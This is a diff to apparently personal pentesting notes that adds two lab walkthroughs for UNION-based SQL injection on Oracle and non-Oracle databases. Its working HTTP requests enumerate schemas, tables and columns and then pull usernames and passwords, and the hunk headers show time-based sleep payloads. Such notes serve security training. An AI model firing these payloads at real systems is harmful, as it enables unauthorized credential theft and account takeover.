@@ -38,7 +38,7 @@ test@test.com' and 1=sleep(3);-- -
 - [ ] Look for any input fields that may be inserting rows into the database and check those for injection as well. 
 
 !!! warning
-Be careful with testing this. Inserting rows into the db without consideration has the potential to break something in the application.
+	Be careful with testing this. Inserting rows into the db without consideration has the potential to break something in the application.
 
 - Examples
 
@@ -222,4 +222,50 @@ test',sleep(5),'');-- -
 ??? example "SQL injection attack, listing the database contents on non-Oracle databases"
 
 	1. Select a category and note the request/response.
-	2. 
+	2. Send the following request to list the schema
+
+	```
+	GET /filter?category=Gifts'%20UNION%20SELECT%20schema_name,null%20FROM%20information_schema.schemata--%20- HTTP/1.1
+	```
+	
+	3. List the tables with:
+	
+	```
+	GET /filter?category=Gifts'%20UNION%20SELECT%20table_name,null%20FROM%20information_schema.tables%20WHERE%20table_schema='public'--%20- HTTP/1.1
+	```
+	
+	4. Now get the columns for the `users_peqxpm` table
+	
+	```
+	GET /filter?category=Gifts'%20UNION%20SELECT%20column_name,null%20FROM%20information_schema.columns%20WHERE%20table_name='users_peqxpm'--%20- HTTP/1.1
+	```
+	
+	5. Get the username and password from the users table
+	
+	```
+	GET /filter?category=Gifts'%20UNION%20SELECT%20username_idgnjq,password_qvlkep%20FROM%20users_peqxpm--%20- HTTP/1.1
+	```
+	
+	6. Log in as the administrator to solve the lab
+
+??? example "SQL injection attack, listing the database contents on Oracle"
+
+	1. Select a category and observe the results
+	2. Send the following request to get all tables
+
+	```
+	GET /filter?category=Pets'%20UNION%20SELECT%20null,table_name%20FROM%20all_tables--%20- HTTP/1.1
+	```
+	
+	3. Get the column names with:
+	
+	```
+	GET /filter?category=Pets'%20UNION%20SELECT%20null,column_name%20FROM%20all_tab_columns%20WHERE%20table_name='USERS_ACKRVW'--%20- HTTP/1.1
+	```
+	
+	4. Get the usernames and passwords with the following request, and then log in as the administrator to solve the lab
+	
+	```
+	GET /filter?category=Pets'%20UNION%20SELECT%20USERNAME_MHJXZT,PASSWORD_WAGPLI%20FROM%20USERS_ACKRVW--%20- HTTP/1.1
+	```
+
